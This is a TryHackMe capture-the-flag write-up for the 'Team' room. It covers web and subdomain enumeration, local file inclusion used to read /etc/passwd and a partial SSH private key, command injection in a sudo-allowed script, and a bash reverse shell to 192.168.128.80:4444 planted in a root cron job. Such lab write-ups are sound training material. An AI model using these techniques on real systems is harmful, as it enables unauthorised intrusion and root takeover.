# Write-up: Team-Full Pwn-Try Hack Me By Mohammed-Ali Member of CyberScope 🚩
**Category:** Full-Pwn
**Level:** Easy/Medium
#### Hello guys we will examine a CTF writeup on TryHackMe which name is ‘Team’.I think, this CTF was an upper beginner but it was so enjoyable. You can reach the machine on this link : https://www.tryhackme.com/room/teamcw
## Reconnaissance 
i used nmap to identify open ports and services
```python
nmap 10.114.169.195 -sC -sV --open -Pn --open -T4
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-23 07:49 -0400
Nmap scan report for team.thm (10.114.169.195)
Host is up (0.089s latency).
Not shown: 997 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bc:61:60:de:3d:e0:d2:52:e5:46:fd:6d:e5:70:0b:d7 (RSA)
|   256 91:df:02:8f:59:16:2a:de:6a:17:96:e0:cc:49:b4:eb (ECDSA)
|_  256 a9:90:df:c7:ee:7f:3c:dc:94:04:7c:97:3d:ba:9a:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Team
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.51 seconds
```
Result >> 
Port 21 >> ftp 
Port 22 >> ssh 
Port 80 >> http 

## Web Enumeration: 
I checked the HTTP service and confirmed that a website is running, locating the default Apache welcome page.

<img width="1436" height="1029" alt="Screenshot_2026-05-23_07_53_47" src="https://github.com/user-attachments/assets/158e1e8f-b23d-42c4-b20d-cf4e1ba946df" />
Its contain like comment >> 

```html
 <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!</title>
    <style type="text/css" media="screen">
```
so  i add the team.thm to /etc/hosts 
```python
sudo su && echo "10.114.169.195   team.thm" >> /etc/hosts
```
Now i opened the website on team.thm

<img width="1916" height="963" alt="Screenshot_2026-05-23_07_59_42" src="https://github.com/user-attachments/assets/6e1fbcca-b684-40ea-b0b8-ded920fce850" />

### I attempted to enumerate hidden directories using Gobuster, which revealed the existence of 

```python
gobuster dir -u http://team.thm/  --wordlist=/home/rootforce/Desktop/all/cyber_security/SecLists-master/common.txt                                                                         20.6s
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/rootforce/Desktop/all/cyber_security/SecLists-master/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 273]
.hta                 (Status: 403) [Size: 273]
.htpasswd            (Status: 403) [Size: 273]
assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
index.html           (Status: 200) [Size: 2966]
robots.txt           (Status: 200) [Size: 5]
scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
server-status        (Status: 403) [Size: 273]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===========================================================
```
the Robots.txt contain dale dale its username i saved it now after i thinking mauber its contain subdomain on team.thm so i use WEFUZZ

If we run wfuzz, there are some subdomains that are not important. If we pay attention to “word size”, this value was 977. So If we take the 977-word size value, this is the same as others. So we should avoid that value.

So let’s run wfuzz again to take more useful information for us.

```python
wfuzz -c -w /home/rootforce/Desktop/all/cyber_security/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt -u "http://team.thm" -H "Host: FUZZ.team.thm" --hw 977              516ms
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://team.thm/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                 
=====================================================================

000000001:   200        89 L     220 W      2966 Ch     "www"                                                                                                                                                                   
000000022:   200        9 L      20 W       187 Ch      "dev"
```
And yes! , we have found some subdomains which are relevant to our main site ‘team.thm’.Let’s add the ‘dev’ subdomain to our /etc/hosts file and go!

```python
sudo su && echo "10.114.169.195   dev.team.thm" >> /etc/hosts
```
We’ve successfully added ‘dev’ subdomain to our host's file to reach that website.

<img width="1913" height="1031" alt="Screenshot_2026-05-23_08_11_56" src="https://github.com/user-attachments/assets/4b3b0f64-2231-4919-a9e7-85ef59aef745" />

If we go to ‘http://dev.team.thm’ website, this page will encounter us. Let’s click “Place holder link to team share”

<img width="1916" height="1030" alt="Screenshot_2026-05-23_08_11_12" src="https://github.com/user-attachments/assets/16df52ae-e0a8-40d7-b829-eff42d475a6c" />

#### This page will show us, if we pay attention to the URL, there is a parameter which name is ‘page’ and this parameter returns a PHP file.

Don’t forget, in the HINT, we’ve been told that ‘this site is under construction so there can be some misconfigurations.

By using this parameter, we can check out LFI and Directory Traversal Vulnerability to read some sensitive data on the remote server.
Press enter or click to view image in full size
<img width="1921" height="1034" alt="Screenshot_2026-05-23_08_14_33" src="https://github.com/user-attachments/assets/1f2ec134-2b6b-4a4c-a987-552d026cd457" />

And Bingo! , we could reach /etc/passwd by directory traversal. This was a Local File Inclusion vulnerability.

To exploit LFI, there can be lots of ways. However, we can begin with easy ones.

You can try Log Poisoning or upload malicious PHP code in other steps but you can check out some ssh keys!

itried to read id_rsa for dale but no result 
<img width="1687" height="1040" alt="Screenshot_2026-05-23_08_17_11" src="https://github.com/user-attachments/assets/c8ac5a12-956e-4fc9-acbe-6d0bcfbcf1c8" />
#### In the second step, I could check /etc/ssh/sshd_config file to reach some private keys.

<img width="1923" height="1031" alt="Screenshot_2026-05-23_08_19_04" src="https://github.com/user-attachments/assets/7b8d9745-b324-4332-9121-61c8842cee49" />

And yes! I’ve successfully reached the sshd_config file. To get the ssh key properly, let’s check out our source code.

Let’s copy this PRIVATE KEY to our attacker machine and make some configurations. However, if you pay attention to ID_RSA private key, there are some ‘#’ signatures. We should avoid those signatures.

```php
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS
xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S
0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2
EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU
eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v
7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v
JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/
FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l
gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4
xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH
ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb
```
now i connect with ssh >>
```python
ssh dale@10.114.169.195 -i id_rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Sat May 23 12:31:21 2026 from 192.168.128.80
dale@ip-10-114-169-195:~$ 
```
### Privilege Escalation:
If we type ‘sudo -l’ command, we can see some users and scripts by sudo privs.
```python
 sudo -l 
Matching Defaults entries for dale on ip-10-114-169-195:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on ip-10-114-169-195:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```
We’ve already known that there is another user which name is gyles

The user ‘gyles’ can execute /home/gyles/admin_checks script.So, if we can manipulate this script with sudo, we can be gyles user. (Horizontal Privilege escalation)

Let’s read this script file and think about manipulating it.

```bash
cat /home/gyles/admin_checks
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```
This is an interesting bash script when we execute this script we are asked the name of the person and date.

However,please pay attention to the $error 2>/dev/null

There is a system command so we can give a value to the ‘error’ parameter to gain a shell as gyles.

Let’s execute this script as gyles user and type /bin/bash command to the error parameter to gain a shell.
```php
 sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: CyberScope
Enter 'date' to timestamp the file: /bin/bash
The Date is whoami
gyles
id 
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
```
And yes ! we could be gyles user now.

From this step, you can use some tools such as linpeas or Linux-privilege-escalation-suggester but I like to enumerate manual machines.

If you go to /opt folder you will find an interesting folder which name is admin_stuff. Let’s jump into it!
```python
cd /opt 
ls
admin_stuff
cd admin
ls
admin_stuff
cd admin_stuff
ls
script.sh
cat script.sh 
#!/bin/bash
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
```
Admin(root) user made a script.sh and this script will execute every minute.

If we read this script, in every minute dev_backup.sh and main_backup.sh will be triggered by script.sh.

We couldn’t change script.sh.However, we can check out backup.sh scripts, if we can change or not.
```python
-rwxrwxr-x  1 root  admin   55 May 23 12:40 main_backup.sh
```
We can change main_backup.sh file.Let’s change this file.
iused this reverse shell 
```python
sh -i >& /dev/tcp/192.168.128.80/4444 0>&1
```
<img width="1311" height="99" alt="Screenshot_2026-05-23_08_31_46" src="https://github.com/user-attachments/assets/735bb224-45ec-4efb-9641-fd25fc812c46" />

I wrote a TCP bash reverse shell script and start listener with Netcat port 4444

<img width="979" height="425" alt="Screenshot_2026-05-23_08_34_31" src="https://github.com/user-attachments/assets/4bbdf828-64ce-4a0a-8f2f-8fdc3260ae41" />

And we did it! We are root now

### About the Author

Mohammed Ali Cybersecurity student focused on penetration testing and Digital Forensics.
accounts on insta

Instagram : https://www.instagram.com/e6ecx/
THM : https://tryhackme.com/p/eng.mohammed.ali.abd

Follow My Journey
I regularly share write-ups and my cybersecurity journey. More content coming soon









